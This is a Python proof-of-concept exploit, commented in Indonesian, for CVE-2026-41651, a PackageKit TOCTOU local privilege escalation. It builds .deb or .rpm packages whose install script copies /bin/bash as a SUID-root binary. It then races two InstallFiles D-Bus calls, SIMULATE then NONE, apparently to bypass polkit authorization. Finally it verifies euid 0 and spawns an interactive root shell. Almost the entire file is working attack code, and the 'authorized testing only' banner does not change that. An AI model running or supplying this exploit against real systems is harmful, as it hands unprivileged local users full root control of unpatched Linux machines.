#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 CVE-2026-41651 - PackageKit TOCTOU Local Privilege Escalation (Pack2TheRoot)
=============================================================================
 Affected  : PackageKit >= 1.0.2 s/d <= 1.3.4
 Fixed in  : PackageKit 1.3.5 (commit 76cfb675)
 Impact    : User lokal tanpa privilege -> root (euid 0)
 Vector    : Local / D-Bus system bus (org.freedesktop.PackageKit)
 CVSS      : 8.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

 MEKANISME
 ---------
 InstallFiles() pada pk-transaction.c menimpa transaction->cached_transaction_flags
 TANPA memeriksa state transaksi. Kita panggil InstallFiles DUA KALI pada
 transaksi yang SAMA:
     call 1 : flags = PK_TRANSACTION_FLAG_SIMULATE (4)  -> operasi "aman",
              lolos/melewati polkit authorization.
     call 2 : flags = PK_TRANSACTION_FLAG_NONE (0)      -> panggilan kedua
              menimpa cached flags SELAGAI transaksi berjalan.
 State-machine guard menolak transisi mundur secara SILENT sehingga flags
 yang sudah korup tetap tertinggal. Saat scheduler mengeksekusi transaksi,
 backend membaca flags terbaru (milik attacker) -> instalasi paket payload
 dijalankan sebagai root -> scriptlet postinst berjalan sebagai root.

 PAYLOAD
 -------
 postinst meng-copy /bin/bash ke direktori writable non-nosuid/non-noexec
 sebagai SUID root (mode 04755). Script lalu mengeksekusi binary tsb dengan
 -p (preserve euid) dan memverifikasi euid/id 0.

 VERIFIKASI
 ----------
 [ROOT CONFIRMED] -> euid=0 / uid=0  => EXPLOIT BERHASIL (exit 0)
 [GAGAL]          -> tidak ada euid/uid 0 => EXPLOIT TIDAK BERHASIL (exit 1)

 USAGE
 -----
   python3 poc_cve_2026_41651.py                 # default: 3 attempt, poll 20s
   python3 poc_cve_2026_41651.py --attempts 5    # tambah retry race
   python3 poc_cve_2026_41651.py --poll 30       # poll lebih lama per attempt
   python3 poc_cve_2026_41651.py --no-shell      # jangan spawn shell interaktif

 REQUIRE
 -------
   python3-gi (GObject introspection)   -> apt install python3-gi
   dpkg-deb  (Debian/Ubuntu)  ATAU
   rpmbuild  (Fedora/RHEL/SUSE)         -> dnf install rpm-build
   PackageKit daemon aktif di system D-Bus.

 FOR AUTHORIZED SECURITY TESTING ONLY.
=============================================================================
"""

import argparse
import os
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

try:
    from gi.repository import Gio, GLib
except ImportError:
    sys.exit(
        "[-] python3-gi tidak terpasang.\n"
        "    Debian/Ubuntu : sudo apt install python3-gi\n"
        "    Fedora/RHEL   : sudo dnf install python3-gobject\n"
        "    Arch          : sudo pacman -S python-gobject"
    )

# ------------------------------------------------------------------ config --
SUID_FILENAME   = ".suid_bash_pk41651"
PK_BUS          = "org.freedesktop.PackageKit"
PK_OBJ          = "/org/freedesktop/PackageKit"
PK_IFACE        = "org.freedesktop.PackageKit"
TX_IFACE        = "org.freedesktop.PackageKit.Transaction"

FLAG_SIMULATE   = 4   # PK_TRANSACTION_FLAG_SIMULATE  -> "aman", trigger auth
FLAG_NONE       = 0   # tanpa flags                    -> install beneran

DEB_OK = "/usr/bin/dpkg-deb"
RPM_OK = "/usr/bin/rpmbuild"

_tmpfiles = []  # untuk cleanup saat signal


# ------------------------------------------------------------ helpers dasar --
def _mount_flags(path: str) -> set:
    """Mount options untuk filesystem pemilik *path* (dari /proc/mounts)."""
    path = os.path.realpath(path)
    best, flags = "", set()
    try:
        with open("/proc/mounts") as fh:
            for line in fh:
                parts = line.split()
                if len(parts) < 4:
                    continue
                mnt = parts[1]
                if path.startswith(mnt) and len(mnt) > len(best):
                    best = mnt
                    flags = set(parts[3].split(","))
    except OSError:
        pass
    return flags


def _find_suid_dir() -> str:
    """Direktori writable yang filesystem-nya TIDAK nosuid / noexec."""
    candidates = ["/var/tmp", "/dev/shm", "/tmp", os.path.expanduser("~")]
    for d in candidates:
        if not os.path.isdir(d) or not os.access(d, os.W_OK):
            continue
        flags = _mount_flags(d)
        if "nosuid" not in flags and "noexec" not in flags:
            return d
    sys.exit(
        "[-] Tidak ada direktori writable yang mendukung SUID + exec.\n"
        "    Dicoba: " + ", ".join(candidates)
    )


def _detect_pkg_mgr() -> str:
    if os.path.exists(DEB_OK):
        return "deb"
    if os.path.exists(RPM_OK):
        return "rpm"
    sys.exit(
        "[-] Tidak ada builder paket: butuh dpkg-deb (Debian/Ubuntu)\n"
        "    atau rpmbuild (Fedora/RHEL/SUSE, paket: rpm-build)."
    )


def _sh_quote(p: str) -> str:
    return "'" + p.replace("'", "'\\''") + "'"


# ------------------------------------------------------------ build paket ----
def _build_deb(out_path: str, pkg_name: str, postinst: str = None) -> None:
    """Build minimal .deb (Architecture: all) dengan postinst opsional."""
    pid = os.getpid()
    build = Path(f"/tmp/pkbuild_{pid}_{pkg_name}")
    deb = build / "DEBIAN"
    deb.mkdir(parents=True, exist_ok=True)
    for d in (build, deb):
        d.chmod(0o755)
    (deb / "control").write_text(
        f"Package: {pkg_name}\nVersion: 1.0\nArchitecture: all\n"
        f"Maintainer: pentest\nDescription: CVE-2026-41651 test package\n"
    )
    (deb / "control").chmod(0o644)
    if postinst:
        pi = deb / "postinst"
        pi.write_text(f"#!/bin/sh\n{postinst}\n")
        pi.chmod(0o755)
    subprocess.run(
        [DEB_OK, "-b", str(build), out_path],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    shutil.rmtree(build, ignore_errors=True)


def _build_rpm(out_dir: str, pkg_name: str, post_script: str = None) -> str:
    """Build minimal .rpm noarch dengan %post opsional."""
    topdir = Path(f"/tmp/rpmbuild_{os.getpid()}_{pkg_name}")
    for sub in ("BUILD", "RPMS", "SOURCES", "SPECS", "SRPMS"):
        d = topdir / sub
        d.mkdir(parents=True, exist_ok=True)
        d.chmod(0o755)
    topdir.chmod(0o755)

    post_section = f"%post\n{post_script}\n" if post_script else ""
    spec_text = f"""%global _topdir {topdir}
Name:        {pkg_name}
Version:     1.0
Release:     1
Summary:     CVE-2026-41651 test package
License:     MIT
BuildArch:   noarch

%description
Pentest test package for CVE-2026-41651.

{post_section}
%files
"""
    spec_path = topdir / "SPECS" / f"{pkg_name}.spec"
    spec_path.write_text(spec_text)
    spec_path.chmod(0o644)

    subprocess.run(
        [RPM_OK, "--define", f"_topdir {topdir}", "-bb", str(spec_path)],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    rpms = list((topdir / "RPMS").rglob("*.rpm"))
    if not rpms:
        sys.exit(f"[-] rpmbuild tidak menghasilkan output untuk {pkg_name}")
    dest = os.path.join(out_dir, f"{pkg_name}.rpm")
    shutil.copy2(str(rpms[0]), dest)
    shutil.rmtree(topdir, ignore_errors=True)
    return dest


def build_packages(pkg_mgr: str, suid_path: str):
    pid = os.getpid()
    payload_script = f"install -m 4755 /bin/bash {_sh_quote(suid_path)}"
    if pkg_mgr == "deb":
        dummy = f"/tmp/pk-dummy-{pid}.deb"
        payload = f"/tmp/pk-payload-{pid}.deb"
        _build_deb(dummy, f"pk-dummy-{pid}")
        _build_deb(payload, f"pk-payload-{pid}", postinst=payload_script)
    else:
        dummy = _build_rpm("/tmp", f"pk-dummy-{pid}")
        payload = _build_rpm("/tmp", f"pk-payload-{pid}", post_script=payload_script)
    return dummy, payload


# ------------------------------------------------------------ D-Bus / race ---
def create_transaction(conn) -> str:
    res = conn.call_sync(
        PK_BUS, PK_OBJ, PK_IFACE, "CreateTransaction",
        None, GLib.VariantType("(o)"),
        Gio.DBusCallFlags.NONE, -1, None,
    )
    return res.unpack()[0]


def fire_race(conn, tid: str, dummy: str, payload: str) -> None:
    """
    Dua panggilan InstallFiles pada transaksi yang sama, tanpa menunggu reply.
    call 1: FLAG_SIMULATE -> melewati/antri authorization (paket dummy).
    call 2: FLAG_NONE     -> menimpa cached flags dengan payload beneran
                             sebelum transaksi dieksekusi backend.
    Signature method (v1.3.4): InstallFiles(t transaction_flags, as full_paths)
    """
    conn.call(
        PK_BUS, tid, TX_IFACE, "InstallFiles",
        GLib.Variant("(tas)", (FLAG_SIMULATE, [dummy])),
        None, Gio.DBusCallFlags.NONE, -1, None, None,
    )
    conn.call(
        PK_BUS, tid, TX_IFACE, "InstallFiles",
        GLib.Variant("(tas)", (FLAG_NONE, [payload])),
        None, Gio.DBusCallFlags.NONE, -1, None, None,
    )
    conn.flush_sync(None)


def poll_suid(path: str, timeout: int) -> bool:
    print(f"[*] Polling SUID binary: {path} (maks {timeout}s)...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st = os.stat(path)
            if (st.st_mode & 0o4000) and st.st_uid == 0:
                print(f"\n[+] SUID binary muncul: {path} mode={oct(st.st_mode)} owner={st.st_uid}")
                return True
        except FileNotFoundError:
            pass
        time.sleep(1)
    print()
    return False


# ------------------------------------------------------------ verifikasi -----
def verify_root(suid_path: str) -> bool:
    """
    Jalankan SUID bash dengan -p (preserve euid), lalu cek euid/id 0.
    Return True jika euid==0 / uid==0 (ROOT CONFIRMED).
    """
    print("[*] Mengeksekusi SUID bash -p dan memverifikasi euid/id...")
    try:
        r = subprocess.run(
            [suid_path, "-p", "-c", "id -u; id"],
            capture_output=True, text=True, timeout=15,
        )
    except Exception as e:
        print(f"[-] Gagal eksekusi SUID binary: {e}")
        return False
    out = (r.stdout or "").strip()
    print(f"[*] Output id: {out}")
    first = out.splitlines()[0].strip() if out.splitlines() else ""
    if first == "0" or "euid=0" in out or "uid=0" in out:
        return True
    return False


# ------------------------------------------------------------ cleanup --------
def cleanup(suid_path: str = None, remove_suid: bool = False) -> None:
    for p in list(_tmpfiles):
        try:
            os.unlink(p)
        except OSError:
            pass
    if remove_suid and suid_path:
        try:
            os.unlink(suid_path)
        except OSError:
            pass


def _sig_handler(signum, frame):
    print("\n[!] Interrupted, membersihkan...")
    cleanup(remove_suid=False)
    sys.exit(130)


# ------------------------------------------------------------ main -----------
def main():
    ap = argparse.ArgumentParser(description="CVE-2026-41651 PackageKit TOCTOU LPE")
    ap.add_argument("--attempts", type=int, default=3, help="jumlah attempt race (default 3)")
    ap.add_argument("--poll", type=int, default=20, help="poll detik per attempt (default 20)")
    ap.add_argument("--no-shell", action="store_true", help="jangan spawn shell interaktif setelah root")
    args = ap.parse_args()

    print("=" * 62)
    print("  CVE-2026-41651 - PackageKit TOCTOU LPE (Pack2TheRoot)")
    print("  Authorized security testing only.")
    print("=" * 62)
    print()

    # 1) cek privilege saat ini
    if os.geteuid() == 0:
        print("[+] Sudah root (euid=0) - tidak perlu exploit.")
        sys.exit(0)

    # 2) preflight
    signal.signal(signal.SIGINT, _sig_handler)
    signal.signal(signal.SIGTERM, _sig_handler)
    os.umask(0o022)

    suid_dir = _find_suid_dir()
    suid_path = os.path.join(suid_dir, SUID_FILENAME)
    print(f"[+] SUID drop dir   : {suid_dir}  (tanpa nosuid/noexec)")

    pkg_mgr = _detect_pkg_mgr()
    print(f"[+] Package format  : {pkg_mgr.upper()}")

    try:
        r = subprocess.run(["pkcon", "--version"], capture_output=True, text=True, timeout=10)
        ver = (r.stdout or r.stderr or "").strip().splitlines()
        if ver:
            print(f"[+] PackageKit versi: {ver[0]}  (vulnerable jika <= 1.3.4)")
    except Exception:
        pass

    print("[*] Membangun paket dummy + payload...")
    dummy_path, payload_path = build_packages(pkg_mgr, suid_path)
    _tmpfiles.extend([dummy_path, payload_path])
    print(f"[+] Dummy pkg   : {dummy_path}")
    print(f"[+] Payload pkg : {payload_path}")
    print(f"[+] Payload     : install -m 4755 /bin/bash {suid_path}")
    print()

    # 3) koneksi D-Bus system
    print("[*] Menghubungkan ke system D-Bus...")
    conn = Gio.bus_get_sync(Gio.BusType.SYSTEM, None)

    # 4) race loop
    success = False
    for attempt in range(1, args.attempts + 1):
        print(f"[*] Attempt {attempt}/{args.attempts} - membuat transaksi baru...")
        try:
            tid = create_transaction(conn)
        except GLib.Error as e:
            print(f"[-] CreateTransaction error: {e}")
            continue
        print(f"[+] Transaction ID: {tid}")
        print("[*] Firing TOCTOU race (SIMULATE -> REAL pada transaksi sama)...")
        fire_race(conn, tid, dummy_path, payload_path)
        if poll_suid(suid_path, args.poll):
            success = True
            break
        print("[-] Window race terlewat, retry...\n")
        time.sleep(1)

    if not success:
        cleanup(remove_suid=True)
        print()
        print("=" * 62)
        print("[-] GAGAL - tidak ada euid/id 0.")
        print("[-] SUID binary tidak muncul; transaksi tidak dieksekusi sebagai root.")
        print("[-] Kemungkinan: sistem sudah di-patch (PackageKit >= 1.3.5),")
        print("    polkit di-hardening, packagekitd tidak aktif, atau timing.")
        print("    Cek versi: pkcon --version | packagekit --version")
        print("=" * 62)
        sys.exit(1)

    # 5) verifikasi euid / id 0
    ok = verify_root(suid_path)
    cleanup()  # hapus paket .deb/.rpm sementara

    print()
    print("=" * 62)
    if ok:
        print("[+] ROOT CONFIRMED - euid/id 0 (root) tercapai.")
        print(f"[+] SUID binary tetap ada di: {suid_path}")
        print("    Hapus setelah selesai: rm -f " + suid_path)
    else:
        print("[-] GAGAL - SUID binary ada tapi euid/id 0 TIDAK tercapai.")
        cleanup(remove_suid=True)
    print("=" * 62)

    if not ok:
        sys.exit(1)

    # 6) spawn shell interaktif (jika diizinkan)
    if not args.no_shell and sys.stdin.isatty():
        print("\n[+] Spawning root shell... ketik 'exit' untuk keluar.\n")
        try:
            os.execl(suid_path, suid_path, "-p")
        except Exception as e:
            print(f"[-] Gagal spawn shell: {e}")
            sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()